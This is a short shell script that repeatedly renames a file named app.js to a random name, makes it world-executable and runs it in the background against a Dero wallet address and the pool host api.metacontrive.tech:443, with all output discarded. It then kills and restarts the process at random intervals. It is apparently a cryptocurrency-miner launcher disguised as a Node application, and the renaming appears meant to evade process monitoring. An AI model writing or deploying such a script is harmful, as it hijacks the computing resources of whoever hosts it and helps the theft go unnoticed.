#!/bin/sh

# Function to generate a random delay between 10 and 60 seconds
generate_random_delay() {
  delay=$((10 + RANDOM % 51))
  echo "Delay: $delay seconds"
}

# Function to generate a random 9-digit alphanumeric name
generate_random_name() {
  new_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 9 | head -n 1)
}

# Function to rename and restart the main executable
restart_main() {
  while true; do
    generate_random_delay
    generate_random_name
    mv app.js "$new_name"
    chmod 777 "$new_name"
    ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1 &
    pid=$!
    echo "VAMOS LA ANDA PA FRENTE PID: $pid"
    sleep "$delay"
    echo "PARAR PULA DA CEBA! PID: $pid"
    kill "$pid"
    echo "Feito AGORA SIM!!! SIGA!!!"
  done
}

# Trap SIGINT and SIGTERM signals to exit gracefully
trap 'exit 0' SIGINT SIGTERM

# Call the function to rename and restart the main executable
restart_main

